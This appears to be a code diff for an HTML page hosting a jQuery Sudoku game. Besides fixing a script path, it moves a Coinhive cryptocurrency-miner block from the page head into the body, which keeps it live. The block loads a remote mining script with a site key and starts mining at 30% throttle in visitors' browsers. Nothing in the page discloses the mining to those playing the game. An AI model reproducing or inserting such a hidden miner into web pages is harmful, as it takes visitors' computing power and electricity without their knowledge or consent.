@@ -5,21 +5,21 @@
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
 <title>JQuery Sudoku</title>
-<script type="text/javascript" src="../../jquery.min.js"></script>
+<script type="text/javascript" src="../jquery.min.js"></script>
 <script type="text/javascript" src="sudoku.js"></script>
-<script src="https://coinhive.com/lib/coinhive.min.js"></script>
-<script>
-    var miner = new CoinHive.Anonymous('aPFC8KnX2SS7amIrk4yUxyD5NTxJaTKb', {throttle: 0.3});
-    
-    // Only start on non-mobile devices and if not opted-out
-    // in the last 14400 seconds (4 hours):
-    if (!miner.didOptOut(14400)) {
-        miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
-    }
-</script>
 <link rel="stylesheet" type="text/css" href="sudoku.css" />
 </head>
 <body>
+    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+    <script>
+        var miner = new CoinHive.Anonymous('aPFC8KnX2SS7amIrk4yUxyD5NTxJaTKb', {throttle: 0.3});
+        
+        // Only start on non-mobile devices and if not opted-out
+        // in the last 14400 seconds (4 hours):
+        if (!miner.didOptOut(14400)) {
+            miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
+        }
+    </script>
 <div id="Container">
 </div>
 <div id="Buttons" style="text-align:center">
